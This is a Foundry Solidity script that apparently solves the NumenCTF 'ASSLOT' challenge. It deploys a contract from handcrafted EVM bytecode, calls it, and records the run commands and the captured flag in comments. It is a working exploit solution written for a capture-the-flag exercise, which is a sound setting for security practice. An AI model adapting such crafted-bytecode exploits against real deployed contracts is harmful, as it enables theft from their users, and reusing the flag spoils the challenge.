// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

// forge script src/NumenCTF/ASSLOT/Exploit.s.sol:ExploitScript -vvvvv --private-key $PRIVATE_KEY --fork-url $RPC_URL --legacy
// forge script src/NumenCTF/ASSLOT/Exploit.s.sol:ExploitScript -vvvvv --private-key $PRIVATE_KEY --fork-url $RPC_URL --legacy --broadcast
// flag: 0x7ade4f46b38a3cb0b879b1c26e23c34eae81b210

contract Exploit {
    function exploit() public {
        bytes memory creationCode =
            hex"603d8060093d393df336610024573d3d60043d3d72f48be067be3f74e623a101ee166200d7a2d2385af13d3df35b3d31316101c3620154b75a030460030360005260206000f3";
        address addr;
        assembly {
            addr := create(0, add(creationCode, 0x20), mload(creationCode))
        }
        addr.call{gas: 100000}("");
    }
}

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        Exploit exploit = new Exploit();
        exploit.exploit{gas: 200000}();
        vm.stopBroadcast();
    }
}
